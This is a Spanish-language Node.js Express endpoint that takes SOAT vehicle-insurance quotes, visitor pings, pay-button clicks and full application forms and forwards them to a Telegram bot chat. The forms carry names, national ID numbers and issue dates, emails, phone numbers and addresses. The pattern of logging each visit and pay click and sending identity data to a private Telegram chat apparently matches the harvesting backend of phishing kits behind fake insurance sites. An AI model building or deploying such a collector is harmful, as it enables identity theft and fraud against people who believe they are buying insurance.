app.post('/notificar', async (req, res) => {
  const datos = req.body;

  let mensaje = "";

  // 👀 Visita al sitio
  if (datos.tipo === "visita") {
    mensaje = "👀 *Nuevo visitante ingresó al sitio*";

  // 📊 Cotización
  } else if (datos.tipo === "cotizacion") {
    mensaje = `
📊 *Nueva cotización de SOAT:*
🚗 *Placa:* ${datos.placa || 'No proporcionada'}
📄 *Clase:* ${datos.clase || 'N/A'}
📌 *Subtipo:* ${datos.subtipo || 'N/A'}
🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
💰 *Valor estimado:* ${datos.valor || '$0'}
`.trim();

  // 🟡 Clic en Pagar (nuevo)
  } else if (datos.tipo === "pago") {
    mensaje = `
🟡 *Clic en Pagar*
📧 Correo: ${datos.correo || 'N/A'}
🚗 Placa: ${datos.placa || 'N/A'}
💵 Valor: ${datos.valor || '$0'}
`.trim();

  // 📥 Envío de formulario completo
  } else {
    mensaje = `
📥 *Nueva solicitud de SOAT*:
🚗 *Placa:* ${datos.placa || 'No proporcionada'}
💵 *Valor estimado:* ${datos.valor || '$0'}

👤 *Nombre:* ${datos.nombres || 'No indicado'}
🆔 *Tipo de documento:* ${datos.tipoDocumento || 'N/A'}
🔢 *Número de documento:* ${datos.documento || 'N/A'}
📅 *Fecha expedición:* ${datos.fechaExpedicion || 'N/A'}
📧 *Email:* ${datos.email || 'N/A'}
📱 *Celular:* ${datos.celular || 'N/A'}
🏠 *Dirección:* ${datos.direccion || 'N/A'}
🏙️ *Ciudad:* ${datos.ciudad || 'N/A'}

🛞 *Marca:* ${datos.marca || 'N/A'}
📆 *Modelo:* ${datos.modelo || 'N/A'}
📆 *Inicio vigencia:* ${datos.inicioVigencia || 'N/A'}

🧾 *Clase:* ${datos.clase || 'N/A'}
📌 *Subtipo:* ${datos.subtipo || 'N/A'}
🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
`.trim();
  }

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown"
    });

    res.status(200).json({ ok: true, msg: 'Notificación enviada a Telegram' });
  } catch (error) {
    console.error('❌ Error enviando a Telegram:', error.message);
    res.status(500).json({ ok: false, msg: 'Error enviando a Telegram' });
  }
});
